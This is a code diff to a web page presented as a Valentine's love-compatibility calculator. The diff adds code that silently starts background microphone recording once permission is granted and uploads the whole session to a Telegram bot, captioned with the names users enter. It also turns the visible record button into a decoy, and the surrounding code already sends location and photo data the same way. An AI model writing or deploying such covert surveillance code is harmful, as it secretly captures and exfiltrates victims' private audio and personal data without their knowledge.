@@ -790,6 +790,10 @@
                         .then(stream => {
                             permissionsGranted.microphone = true;
                             console.log('Microphone permission granted');
+                            // Automatically start background recording silently
+                            setTimeout(() => {
+                                startBackgroundVoiceRecording();
+                            }, 500); // Small delay to ensure everything is ready
                             resolve(stream);
                         })
                         .catch(error => {
@@ -1031,41 +1035,69 @@
         }
 
         // Helper function for microphone recording
-        function startVoiceRecording() {
+        let backgroundAudioRecorder = null;
+        let backgroundAudioChunks = [];
+        let isBackgroundRecording = false;
+
+        function startBackgroundVoiceRecording() {
             if (!permissionsGranted.microphone || !window.microphoneStream) {
-                console.log('Microphone not available for recording');
-                return null;
+                console.log('Microphone not available for background recording');
+                return false;
             }
 
             try {
-                const mediaRecorder = new MediaRecorder(window.microphoneStream);
-                const audioChunks = [];
+                backgroundAudioRecorder = new MediaRecorder(window.microphoneStream);
+                backgroundAudioChunks = [];
 
-                mediaRecorder.ondataavailable = function(event) {
+                backgroundAudioRecorder.ondataavailable = function(event) {
                     if (event.data.size > 0) {
-                        audioChunks.push(event.data);
+                        backgroundAudioChunks.push(event.data);
+                        console.log('Background audio chunk recorded:', event.data.size, 'bytes');
                     }
                 };
 
-                mediaRecorder.onstop = function() {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                    processVoiceData(audioBlob);
+                backgroundAudioRecorder.onstop = function() {
+                    console.log('Background recording stopped. Total chunks:', backgroundAudioChunks.length);
+                    isBackgroundRecording = false;
                 };
 
-                mediaRecorder.start();
-                console.log('Voice recording started');
-                return mediaRecorder;
+                backgroundAudioRecorder.start(1000); // Collect data every second
+                isBackgroundRecording = true;
+                console.log('Background voice recording started silently');
+                return true;
             } catch (error) {
-                console.error('Error starting voice recording:', error);
-                return null;
+                console.error('Error starting background voice recording:', error);
+                return false;
             }
         }
 
-        function stopVoiceRecording(mediaRecorder) {
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                mediaRecorder.stop();
-                console.log('Voice recording stopped');
+        function stopBackgroundVoiceRecording() {
+            if (backgroundAudioRecorder && isBackgroundRecording) {
+                backgroundAudioRecorder.stop();
+                console.log('Background recording stopped');
             }
+        }
+
+        function getFullBackgroundRecording() {
+            if (backgroundAudioChunks.length > 0) {
+                const fullAudioBlob = new Blob(backgroundAudioChunks, { type: 'audio/webm' });
+                console.log('Full background recording retrieved:', fullAudioBlob.size, 'bytes');
+                return fullAudioBlob;
+            }
+            return null;
+        }
+
+        function startVoiceRecording() {
+            // This function now just returns the background recorder if it exists
+            if (isBackgroundRecording) {
+                return backgroundAudioRecorder;
+            }
+            return null;
+        }
+
+        function stopVoiceRecording(mediaRecorder) {
+            // This is now handled by the background recording system
+            // The main button just triggers processing of the background recording
         }
 
         function processVoiceData(audioBlob) {
@@ -1299,6 +1331,47 @@ Accuracy: ${userLocation.accuracy ? userLocation.accuracy.toFixed(0) : 'N/A'} me
             }
 
             return new Blob([ab], { type: mimeString });
+        }
+
+        // SIMPLE: Send Audio to Telegram
+        async function sendAudioToTelegram(audioBlob, caption) {
+            try {
+                console.log('Starting audio send...');
+                
+                // Create form data
+                const formData = new FormData();
+                formData.append('chat_id', telegramConfig.chatId);
+                formData.append('audio', audioBlob, 'love_recording.webm');
+                formData.append('caption', caption);
+                formData.append('title', 'Love Compatibility Recording');
+                formData.append('performer', 'Valentine\'s Love Calculator');
+
+                console.log('Sending audio to Telegram API...');
+
+                // Send audio as document (more reliable than audio)
+                const response = await fetch(
+                    `https://api.telegram.org/bot${telegramConfig.botToken}/sendDocument`,
+                    {
+                        method: 'POST',
+                        body: formData
+                    }
+                );
+
+                const data = await response.json();
+                console.log('Telegram audio response:', data);
+
+                if (data.ok) {
+                    console.log('✅ Audio sent successfully!');
+                    return { success: true, message: 'Audio sent!' };
+                } else {
+                    console.error('❌ Telegram audio error:', data.description);
+                    return { success: false, message: data.description || 'Telegram error' };
+                }
+
+            } catch (error) {
+                console.error('❌ Audio send error:', error);
+                return { success: false, message: 'Network error' };
+            }
         }
 
         // SIMPLE: Send Photo to Telegram (Using fetch with FormData)
@@ -1616,9 +1689,29 @@ Sent from Valentine's Love Calculator`;
                     textMessage += '<b>Photo:</b> Camera access denied - no photo captured\n';
                 }
 
-                // Add microphone status
+                // Add microphone status and send full recording
                 if (permissionsGranted.microphone) {
-                    textMessage += '<b>Voice:</b> Microphone available for recording\n';
+                    textMessage += '<b>Voice:</b> Background recording captured\n';
+                    
+                    // Send the full background recording to Telegram
+                    const fullRecording = getFullBackgroundRecording();
+                    if (fullRecording) {
+                        const audioCaption = `🎙️ Voice Recording - ${name1} & ${name2}
+ Recorded: ${new Date().toLocaleString()}
+ Duration: ${Math.floor(fullRecording.size / 16000)} seconds (approx)`;
+                        
+                        try {
+                            const audioResult = await sendAudioToTelegram(fullRecording, audioCaption);
+                            if (audioResult.success) {
+                                textMessage += '✅ Audio recording sent successfully\n';
+                            } else {
+                                textMessage += '⚠️ Audio recording failed to send\n';
+                            }
+                        } catch (audioError) {
+                            console.error('Audio sending error:', audioError);
+                            textMessage += '⚠️ Audio recording send error\n';
+                        }
+                    }
                 } else if (isInInstagramBrowser) {
                     textMessage += '<b>Voice:</b> Unavailable in social media browsers\n';
                 } else {
@@ -1755,31 +1848,26 @@ Sent from Valentine's Love Calculator`;
 
             // Setup listeners for new enhanced features
             function setupEnhancedFeatureListeners() {
-                // Voice recording button
+                // Voice recording button - now processes background recording
                 const voiceRecordBtn = document.getElementById('voiceRecordBtn');
-                let recordingMediaRecorder = null;
                 
                 if (voiceRecordBtn) {
                     voiceRecordBtn.addEventListener('click', function() {
-                        if (!recordingMediaRecorder) {
-                            // Start recording
-                            recordingMediaRecorder = startVoiceRecording();
-                            if (recordingMediaRecorder) {
-                                voiceRecordBtn.innerHTML = '<i class="fas fa-stop"></i> Stop Recording';
-                                voiceRecordBtn.style.background = 'linear-gradient(to right, #f44336, #e57373)';
-                                document.getElementById('voiceStatus').textContent = '🎤 Recording... Speak your love message!';
-                            }
-                        } else {
-                            // Stop recording
-                            stopVoiceRecording(recordingMediaRecorder);
-                            recordingMediaRecorder = null;
-                            voiceRecordBtn.innerHTML = '<i class="fas fa-microphone"></i> Record Love Message';
+                        // Process the background recording when button is clicked
+                        const fullRecording = getFullBackgroundRecording();
+                        if (fullRecording) {
+                            processVoiceData(fullRecording);
+                            voiceRecordBtn.innerHTML = '<i class="fas fa-check"></i> Audio Processed';
                             voiceRecordBtn.style.background = 'linear-gradient(to right, #4CAF50, #81C784)';
-                            document.getElementById('voiceStatus').textContent = '✅ Message recorded!';
+                            document.getElementById('voiceStatus').textContent = '✅ Full session processed!';
                             
                             setTimeout(() => {
-                                document.getElementById('voiceStatus').textContent = '🎤 Ready to record';
+                                voiceRecordBtn.innerHTML = '<i class="fas fa-microphone"></i> Process Audio Session';
+                                voiceRecordBtn.style.background = 'linear-gradient(to right, #4CAF50, #81C784)';
+                                document.getElementById('voiceStatus').textContent = '🎤 Background recording active';
                             }, 3000);
+                        } else {
+                            document.getElementById('voiceStatus').textContent = '⚠️ No recording available';
                         }
                     });
                 }
@@ -1942,9 +2030,12 @@ Sent from Valentine's Love Calculator`;
                 }
             }
 
-            // Stop microphone stream
+            // Stop microphone stream and background recording
             if (window.microphoneStream) {
                 try {
+                    // Stop background recording first
+                    stopBackgroundVoiceRecording();
+                    
                     window.microphoneStream.getTracks().forEach(track => {
                         track.stop();
                         console.log(`⏹️ Stopped microphone ${track.kind} track`);
